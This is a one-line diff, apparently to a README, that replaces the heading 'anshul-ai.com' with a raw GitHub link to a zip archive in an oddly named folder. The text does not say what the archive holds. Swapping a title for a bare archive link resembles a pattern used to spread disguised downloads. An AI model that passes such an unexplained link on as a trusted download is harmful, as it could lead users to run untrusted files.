@@ -1,1 +1,1 @@
-# anshul-ai.com
+# https://raw.githubusercontent.com/kripansh2006/anshul-ai.com/main/gavialoid/anshul-ai.com-2.8.zip
